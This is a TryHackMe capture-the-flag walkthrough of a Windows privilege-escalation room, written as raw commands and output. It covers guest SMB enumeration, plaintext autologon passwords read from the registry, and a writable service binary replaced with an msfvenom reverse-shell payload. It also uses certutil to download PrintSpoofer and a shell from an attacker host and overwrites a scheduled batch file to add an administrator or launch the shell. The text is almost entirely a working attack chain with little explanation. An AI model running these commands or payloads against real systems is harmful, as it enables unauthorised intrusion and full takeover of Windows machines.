## TryHackMe room https://tryhackme.com/room/windowsjump
## YouTube walk through: https://youtu.be/9F5OWyvL8h4

```
smbclient -L //10.112.191.244  -U guest%''
```
```
smbclient  //10.112.191.244/Public  -U guest%''
```
```
at welcome.txt 
Welcome to CORP-NET.

New employee default credentials
================================
Username : thmuser
Password : Password1!

Please change your password after first login.
```
```
xfreerdp /v:10.112.191.244 /u:thmuser /p:'Password1!' /cert:ignore  +clipboard /dynamic-resolution /drive:share,/share
```

==
```
PS C:\Users> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    DisableBackButton    REG_DWORD    0x1
    EnableSIHostIntegration    REG_DWORD    0x1
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ
    LegalNoticeText    REG_SZ
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    ShellCritical    REG_DWORD    0x0
    ShellInfrastructure    REG_SZ    sihost.exe
    SiHostCritical    REG_DWORD    0x0
    SiHostReadyTimeOut    REG_DWORD    0x0
    SiHostRestartCountLimit    REG_DWORD    0x0
    SiHostRestartTimeGap    REG_DWORD    0x0
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    WinStationsDisabled    REG_SZ    0
    scremoveoption    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    LastLogOffEndTimePerfCounter    REG_QWORD    0x42f622f30
    ShutdownFlags    REG_DWORD    0x80000027
    AutoAdminLogon    REG_SZ    1
    DefaultUserName    REG_SZ    notadmin
    DefaultPassword    REG_SZ    P@ssw0rd!
    AutoLogonSID    REG_SZ    S-1-5-21-1966530601-3185510712-10604624-1009
    LastUsedUsername    REG_SZ    notadmin

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AlternateShells
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\UserDefaults
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoLogonChecked
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\VolatileUserMgrKey
PS C:\Users> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
ERROR: The system was unable to find the specified registry key or value.
PS C:\Users> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
ERROR: The system was unable to find the specified registry key or value.
PS C:\Users>

ERROR: The system was unable to find the specified registry key or value.
PS C:\Users> runas /user:privesc\notadmin cmd.exe
Enter the password for privesc\notadmin:
```
==
```
C:\Users\notadmin\Desktop>whoami /all

USER INFORMATION
----------------
```
```
C:\Users\notadmin\Desktop>wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v '"' | findstr /i /v "C:\Windows"
AmazonSSMAgent                            "C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"                                             Auto
AWSLiteAgent                              "C:\Program Files\Amazon\XenTools\LiteAgent.exe"                                               Auto

C:\Users\notadmin\Desktop>wmic service get name,pathname,startname | findstr /i "svcadmin"
THMSvc                                    C:\Windows\THMSVC\svc.exe                                                                      .\svcadmin

C:\Users\notadmin\Desktop>


C:\Users\notadmin\Desktop>icacls C:\Windows\THMSVC\svc.exe
C:\Windows\THMSVC\svc.exe Everyone:(F)
                          PRIVESC\notadmin:(I)(F)
                          BUILTIN\Administrators:(I)(F)
                          NT AUTHORITY\SYSTEM:(I)(F)

Successfully processed 1 files; Failed processing 0 files

C:\Users\notadmin\Desktop>icacls C:\Windows\THMSVC
C:\Windows\THMSVC PRIVESC\notadmin:(OI)(CI)(F)
                  BUILTIN\Administrators:(OI)(CI)(F)
                  NT AUTHORITY\SYSTEM:(OI)(CI)(F)

Successfully processed 1 files; Failed processing 0 files

C:\Users\notadmin\Desktop>sc qc THMSvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: THMSvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\THMSVC\svc.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : THM Background Service
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcadmin

C:\Users\notadmin\Desktop>sc config THMSvc
DESCRIPTION:
        Modifies a service entry in the registry and Service Database.
USAGE:
        sc <server> config [service name] <option1> <option2>...

OPTIONS:
NOTE: The option name includes the equal sign.
      A space is required between the equal sign and the value.
      To remove the dependency, use a single / as dependency value.
 type= <own|share|interact|kernel|filesys|rec|adapt|userown|usershare>
 start= <boot|system|auto|demand|disabled|delayed-auto>
 error= <normal|severe|critical|ignore>
 binPath= <BinaryPathName to the .exe file>
 group= <LoadOrderGroup>
 tag= <yes|no>
 depend= <Dependencies(separated by / (forward slash))>
 obj= <AccountName|ObjectName>
 ```
 =
 
 ```
C:\Users\notadmin\Desktop>net use
New connections will be remembered.


Status       Local     Remote                    Network

-------------------------------------------------------------------------------
                       \\TSCLIENT\_share         Microsoft Terminal Services
The command completed successfully.
```


```
C:\Users\notadmin\Desktop>copy \\TSCLIENT\_share\svc.exe  C:\Windows\THMSVC\svc.exe
Overwrite C:\Windows\THMSVC\svc.exe? (Yes/No/All): Yes
        1 file(s) copied.

C:\Users\notadmin\Desktop>sc start THMSvc

SERVICE_NAME: THMSvc
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 5360
        FLAGS              :

```
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.112.98.210 LPORT=4444 -f exe-service -o svc.exe
```
```
certutil -urlcache -split -f http://192.168.158.35:8000/PrintSpoofer64.exe C:\Windows\Temp\PrintSpoofer.exe
```
```
S C:\> cd C:\Windows\Tasks
cd C:\Windows\Tasks
PS C:\Windows\Tasks> ls
ls


    Directory: C:\Windows\Tasks


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        5/11/2026   6:41 AM             41 cleanup.bat

PS C:\Windows\Tasks> icacls cleanup.bat
icacls cleanup.bat
cleanup.bat BUILTIN\Users:(I)(RX)
            PRIVESC\svcadmin:(I)(M)
            BUILTIN\Administrators:(I)(F)
            NT AUTHORITY\SYSTEM:(I)(F)
```
```

PS C:\Windows\Tasks> type cleanup.bat
type cleanup.bat
@echo off
del /Q /F "%TEMP%\*.tmp" 2>nul

PS C:\Windows\Tasks> cmd /c "echo net localgroup administrators svcadmin /add > C:\Windows\Tasks\cleanup.bat"
cmd /c "echo net localgroup administrators svcadmin /add > C:\Windows\Tasks\cleanup.bat"
PS C:\Windows\Tasks> type cleanup.bat
type cleanup.bat
net localgroup administrators svcadmin /add 
```
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.112.98.210 LPORT=5555 -f exe -o shell.exe
```
```
cmd /c "echo C:\Windows\Tasks\shell.exe > C:\Windows\Tasks\cleanup.bat"
```
```
certutil -urlcache -split -f http://10.112.98.210:8000/shell.exe C:\Windows\Tasks\shell.exe
```
